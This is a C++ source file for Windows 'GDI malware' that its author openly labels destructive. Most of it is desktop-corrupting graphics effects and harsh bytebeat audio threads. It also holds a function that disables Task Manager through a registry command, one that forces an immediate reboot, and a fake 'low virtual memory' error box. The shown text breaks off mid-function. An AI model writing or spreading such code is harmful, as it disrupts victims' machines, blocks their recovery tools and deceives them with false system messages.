#include <windows.h>

#include <cmath>
#include <windowsx.h>
#include <shellapi.h>
#include <ctime>
#define RANDRGB (COLORREF)RGB(rand()%255, rand()%255, rand()%255)
#define LIGHTRGB (COLORREF)RGB(rand () % 100, rand () % 100, rand () % 100)
#define FasTcbrt(a) (a)/300
#define FasTsqrt(a) (a)/100
#define min(a,b) (((a)<(b))?(a):(b))
#define max(a,b) (((a)>(b))?(a):(b))
// WARNING! This malware is kind of destructive! It will disable Task Manager!
// By far it's my biggest creation yet



;typedef struct 
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{

	
	// credits to ArTicZera (JhoPro) and Wipet

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed   = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue  = (BYTE)(b * 255.f);

		return rgb;
	}
}

double intensity = 0.0;
bool state = false;
typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;

COLORREF COLORHSL(int length) {
    double h = fmod(length, 360.0);
    double s = 1.0;
    double l = 0.5;

    double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
    double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
    double m = l - c / 2.0;

    double r1, g1, b1;
    if (h < 60) {
        r1 = c;
        g1 = x;
        b1 = 0;
    }
    else if (h < 120) {
        r1 = x;
        g1 = c;
        b1 = 0;
    }
    else if (h < 180) {
        r1 = 0;
        g1 = c;
        b1 = x;
    }
    else if (h < 240) {
        r1 = 0;
        g1 = x;
        b1 = c;
    }
    else if (h < 300) {
        r1 = x;
        g1 = 0;
        b1 = c;
    }
    else {
        r1 = c;
        g1 = 0;
        b1 = x;
    }

    int red = static_cast<int>((r1 + m) * 255);
    int green = static_cast<int>((g1 + m) * 255);
    int blue = static_cast<int>((b1 + m) * 255);

    return RGB(red, green, blue);
}


struct Point3D {
    float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, COLORREF color) {
    HBRUSH brush = CreateSolidBrush(color);
    SelectObject(hdc, brush);
    DrawIcon(hdc, x - 20, y - 20, LoadIcon(NULL, IDI_APPLICATION));  // Draw an ellipse with 50x50 size
    DeleteObject(brush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
    float cosX = cos(angleX), sinX = sin(angleX);
    float cosY = cos(angleY), sinY = sin(angleY);
    float cosZ = cos(angleZ), sinZ = sin(angleZ);

    float y = point.y * cosX - point.z * sinX;
    float z = point.y * sinX + point.z * cosX;
    point.y = y;
    point.z = z;

    float x = point.x * cosY + point.z * sinY;
    z = -point.x * sinY + point.z * cosY;
    point.x = x;
    point.z = z;

    x = point.x * cosZ - point.y * sinZ;
    y = point.x * sinZ + point.y * cosZ;
    point.x = x;
    point.y = y;

    return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
    Point3D vertices[8] = {
        {-size, -size, -size},
        {size, -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size},
    };

    POINT screenPoints[8];

    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
        COLORREF color = COLORHSL(colorA);

        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);

        screenPoints[i].x = screenX;
        screenPoints[i].y = screenY;

        DrawEllipseAt(hdc, screenX, screenY, color);
    }

    POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
    Polyline(hdc, polyline1, 5);

    POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
    Polyline(hdc, polyline2, 5);

    POINT connectingLines[8] = {
        screenPoints[0], screenPoints[4],
        screenPoints[1], screenPoints[5],
        screenPoints[2], screenPoints[6],
        screenPoints[3], screenPoints[7]
    };
    Polyline(hdc, &connectingLines[0], 2);
    Polyline(hdc, &connectingLines[2], 2);
    Polyline(hdc, &connectingLines[4], 2);
    Polyline(hdc, &connectingLines[6], 2);
}

typedef union _RGBQUAD{
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE reversed;
	};
}_RGBQUAD, *PRGBQUAD;

typedef union COLOR{

    COLORREF rgb;
    struct {
        BYTE blue;
        BYTE green;
        BYTE red;
        BYTE alpha;
    };

} COLOR;

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    SelectObject(hdc, CreateSolidBrush(RANDRGB));
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

VOID WINAPI cicopy(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateRectRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    SelectObject(hdc, CreateSolidBrush(RANDRGB));
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}





VOID WINAPI kill(HANDLE hndvd) {
	TerminateThread(hndvd, 0);
	CloseHandle(hndvd);
}

VOID WINAPI refresh() {
	InvalidateRect(0, 0, 0);
}


DWORD WINAPI payload(LPVOID lppld)
{
    HDC hdc;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, !(rand () % 5) ? SRCAND : SRCPAINT);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI sharpening(LPVOID lpshrp)
{

		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		while (1) {
		
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, 0, 0, sw + 1, sh - 1, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, 0, 0, sw - 1, sh + 1, hdc, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1000);
	}
}

VOID WINAPI AudioFx1() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22020, 22020, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22020 * 20] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*cos(t>>12)); //inspired by Mythlas

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI stretch(LPVOID lpstrc)
{
	HDC desk;
	int sw, sh;
	
	while(1){
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(desk, 0, -20, sw, sh+40, desk, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(desk, 0, 20, sw, sh-40, desk, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, desk);
	}
}

DWORD WINAPI hsl(LPVOID lphsl)
{
	HDC hdc = GetDC(NULL);
	HDC hdccopy = CreateCompatibleDC(hdc);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	HBITMAP hbp;
	
	bmi.bmiHeader.biSize = sizeof(bmi);
	bmi.bmiHeader.biWidth = sw;
	bmi.bmiHeader.biHeight = sh;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	
	hbp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdccopy, hbp);
	
	INT i = 0;
	
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdccopy, 0, 0, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		
		RGBQUAD rgbquadCopy;
		
		for (int x = 0; x < sw; x++)
		{
			for (int y = 0; y < sh; y++)
			{
				int index = y * sw + x;
				int fx = (int)((i ^ 4)+(i * 4)*sqrt(RGB(5, 10, 15)));
				
				rgbquadCopy = rgbquad[index];
				
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / sh * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		
		StretchBlt(hdc, 0, 0, sw, sh, hdccopy, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}

DWORD fakeerror() {
	MessageBoxA(NULL, "Y?o?u?r? ?s?y?s?t?e?m? ?i?s? ?l?o?w? ?o?n virtua?l? ?m?e?m?o?r?y?.? ?W?i?n?d?o?w?s is i?n?cre?as?i?n?g? ?t?h?e? ?s?i?z?e? ?of you?r? ?v?irtu?a?l ?m?e?m?o?r?y? ?p?a?ging f?i?l?e?.? ?D?uri?n?g? th?i?s? ?p?r?ocess,? ?m?e?m?o?r?y? ?requ?e?s?t?s? f?o?r some? ?a?p?p?l?i?c?a?t?i?o?ns ?m?a?y? ?b?e deni?e?d?.? ?F?o?r? ?m?o?r?e? ?info?r?m?ation,? ?s?e?e? ?H?e?l?p?", "NULL", MB_OK | MB_ICONERROR);
}

DWORD disabler() {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
}

VOID WINAPI Restart() {
	system("shutdown -r -t 0");
}

VOID WINAPI AudioFx2() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22020, 22020, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22020 * 20] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*cos(t>>7)); //FAST BYTEBEAT

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI xorhsl(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = (x ^ y) ^ (i*4);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}

VOID WINAPI AudioFx3() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8010, 8010, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8010 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<unsigned char>(((t>>2)*(t<<2)/800)*t*3); //stutter

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI glitch(LPVOID lpParam)
{
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double moveangle = 0;
    while (1) {
        HDC hdc = GetDC(0);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        int rx = rand() % sw;
        int ry = rand() % sh;
        BitBlt(hdc, 100, ry, sw, 960, hdc, 0, ry, SRCCOPY);
        BitBlt(hdc, -100, ry, sw, -960, hdc, 0, ry, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}



DWORD WINAPI circling(LPVOID lpcr)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10*cos(x), rand() % 10, SRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI square(LPVOID lpParam)
{
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
        for (int i = 0; i < size; i+=100)
        {
            cicopy(x-i/2, y-i/2, i, i);
            Sleep(10);
        }
    }
}

DWORD WINAPI circle(LPVOID lpParam)
{
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(10);
        }
    }
}

DWORD WINAPI patblt(LPVOID lppat)
{
	while(1){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN);
    HBRUSH brush = CreateSolidBrush(LIGHTRGB);
    SelectObject(hdc, brush);
    PatBlt(hdc, 0, 0, w, h, PATINVERT);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI shader(LPVOID lpshd)
{
int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    int x2 = 0;
    int y2 = 0;
    int angle = 0;

    COLOR* data = (COLOR*)VirtualAlloc(0, (x * y + x) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateBitmap(x, y, 1, 32, data);
    SelectObject(mdc, bmp);

    while (true) {
        BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(bmp, x * y * sizeof(COLOR), data);

        for (int i = 0; i < x * y; i++) {
            x2 = sin(angle) * 20;
            y2 = cos(angle) * 20;

            data[i].blue = (((i % x) + x2) * ((i / y) + y2)) / 2;
            data[i].rgb = (data[i].rgb + 360);
        }

        SetBitmapBits(bmp, x * y * sizeof(COLOR), data);
        BitBlt(hdc, 0, 0, x, y, mdc, 3, 3, SRCCOPY);

        Sleep(10);

        angle++;
    }
}

DWORD WINAPI mashing(LPVOID lpm)
{
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 5, 0, rand() % sw, rand() % sh, hdc, rand() % 5, 0, SRCCOPY);
		ReleaseDC(0, hdc);
	}


VOID WINAPI AudioFx5() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8560, 8560, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8560 * 23] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t%378|t%252)/300); //cool solaris bytebeat or not idk

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI cube(LPVOID lpParam)
{
    int signX = 1;
    int signY = 1;
    int incrementor = 5;
    float x2 = 100.0f;
    float y2 = 100.0f;
    float angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f;
    float angleIncrement = 0.05f;
    float colorA = 0;
    float size = 0.0f;

    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);

        x2 += incrementor * signX;
        y2 += incrementor * signY;

        if (x2 + 75 >= x) {
            signX = -1;
            x2 = x - 76;
        }
        else if (x2 <= 75) {
            signX = 1;
            x2 = 76;
        }

        if (y2 + 75 >= y) {
            signY = -1;
            y2 = y - 76;
        }
        else if (y2 <= 75) {
            signY = 1;
            y2 = 76;
        }

        Point3D center = { x2, y2, 0.0f };
        Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);

        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;

		Sleep(10);

        ReleaseDC(0, hdc);
        colorA += 1;

        if (size >= 0 && size <= 100) {
            size += 0.5;
        }
    }

    return 0;
}

VOID WINAPI AudioFx7() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8500, 8500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8500 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t*5)>>(t>>9&3)^t)*cos(t>>10)); //glitch

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI melter(LPVOID lpmlt)
{
	while(1){
    	HDC hdc = GetDC(NULL);
    	int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN),
        rx = rand() % w;
   		BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCPAINT);
    	ReleaseDC(NULL, hdc);
    	InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI splitter(LPVOID lpsplit)
{
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    int rx = 0;
    int ry = 0;

    HDC hdc = GetDC(0);

    while (true) {
        hdc = GetDC(0);

        BitBlt(hdc, -5, -5, x / 2, y / 2, hdc, 0, 0, SRCERASE); //0x92b246a8clu

        BitBlt(hdc, x / 2 + 5, -5, x / 2, y / 2, hdc, x / 2, 0, SRCERASE);

        BitBlt(hdc, -5, y / 2 + 5, x / 2, y / 2, hdc, 0, y / 2, SRCERASE);

        BitBlt(hdc, x / 2 + 5, y / 2 + 5, x / 2, y / 2, hdc, x / 2, y / 2, SRCERASE);
        
        Sleep(20);
        
    }
    return 0;
}

VOID WINAPI AudioFx8() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44000, 44000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[44000 * 20] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*cos(t>>15)*t); //glitch

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI squareblt(LPVOID lpsqr)
{
		HDC hdc = GetDC(0);
        int sx = GetSystemMetrics(SM_CXSCREEN);
        int sy = GetSystemMetrics(SM_CYSCREEN);

        for (int i = 0; i < sx; i += 200) {
            StretchBlt(hdc, sx, sy, 200, 200, hdc, sx - 5, sy - 5, 210, 210, SRCCOPY);
        }
        Sleep(10);
    }


VOID WINAPI AudioFx9() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 50] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t*t>>14)*cos(t>>8)); //solaris inspired sound

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI pat(LPVOID lppat2)
{
	while (1) {
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN),
			h = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush = CreateSolidBrush(RANDRGB);
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(1000);
	}
}

DWORD WINAPI roto(LPVOID lproto)
{
	HDC hdc = GetDC(0);
	RECT rekt;
	POINT rotate[3];

	while (true) {
		int rnd = rand() % 65 + 60;

		for (int i = 0; i < rnd; i += 20) {
			GetWindowRect(GetDesktopWindow(), &rekt);

			rotate[0].x = rekt.left + i;
			rotate[0].y = rekt.top - i;
			rotate[1].x = rekt.right + i;
			rotate[1].y = rekt.top + i;
			rotate[2].x = rekt.left - i;
			rotate[2].y = rekt.bottom - i;

			PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			Sleep(40);
		}
		for (int i = 0; i < rnd; i += 20) {
			GetWindowRect(GetDesktopWindow(), &rekt);

			rotate[0].x = rekt.left - i;
			rotate[0].y = rekt.top + i;
			rotate[1].x = rekt.right - i;
			rotate[1].y = rekt.top - i;
			rotate[2].x = rekt.left + i;
			rotate[2].y = rekt.bottom + i;

			PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			Sleep(40);
		}
	}
}

DWORD WINAPI squares(LPVOID lpParam)
{
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		HDC hdc = GetDC(NULL);
		int a = rand() % sw, b = rand() % sh;
		BitBlt(hdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(500);
	}
}

VOID WINAPI AudioFx10() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 35] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t*(t>>12)^t)*sin(t>>14)); //cool malware sound

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI AudioFx11() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 7600, 7600, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[7600 * 26] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*rand()); //sualorz

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI rgbquad(LPVOID lpParam)
{
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h && rand() % 110)
                v = rand() % 2;
                    *((BYTE*)data + 4 * i + v) = i;
        }
